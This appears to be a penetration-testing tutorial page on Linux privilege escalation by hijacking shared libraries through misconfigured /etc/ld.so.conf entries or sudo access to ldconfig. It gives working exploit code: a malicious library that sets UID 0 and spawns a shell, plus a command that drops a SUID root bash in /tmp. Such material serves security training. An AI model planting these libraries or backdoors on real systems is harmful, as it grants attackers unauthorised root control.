# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Prepare the environment

In the following section you can find the code of the files we are going to use to prepare the environment

{{#tabs}}
{{#tab name="sharedvuln.c"}}

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```

{{#endtab}}

{{#tab name="libcustom.h"}}

```c
#include <stdio.h>

void vuln_func();
```

{{#endtab}}

{{#tab name="libcustom.c"}}

```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```

{{#endtab}}
{{#endtabs}}

1. **Create** those files in your machine in the same folder
2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` to `/usr/lib` and refresh the cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.

```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

### Useful triage commands

When attacking a real target, verify the **exact library name** the binary needs and what the loader is **currently resolving**:

```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
  # x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```

A couple of useful gotchas:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` usually **doesn't work** because
  the redirection is done by your current shell. Use
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` instead.
- **SUID/privileged** binaries ignore `LD_LIBRARY_PATH`/`LD_PRELOAD` in
  **secure-execution mode**, but directories coming from `/etc/ld.so.conf` are
  still part of the trusted loader configuration, so this misconfiguration can
  still affect privileged programs.
- On newer glibc versions, the dynamic loader also exposes
  `--list-diagnostics`, which is handy to debug cache resolution and
  `glibc-hwcaps` subdirectory selection when a hijack doesn't behave as
  expected.

## Exploit

In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:

```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```

The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
**Download and compile** the following code inside that path:

```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
    setuid(0);
    setgid(0);
    puts("I'm the bad library");
    system("/bin/sh");
}
```

If you expect **root** (or another privileged account) to execute the vulnerable binary later, it is usually better to leave a **root-owned artifact** instead of spawning an interactive shell. For example:

```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```

Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.

Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).

Once this has happened **recheck** where the `sharedvuln` executable is loading the `libcustom.so` library from:

```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

> [!TIP]
> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.

### Other misconfigurations - Same vuln

In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.

## Exploit 2

**Suppose you have sudo privileges over `ldconfig`**.\
You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
So, lets create the files and folders needed to load "/tmp":

```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
And finally, lets load the path and check where is the binary loading the library from:

```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
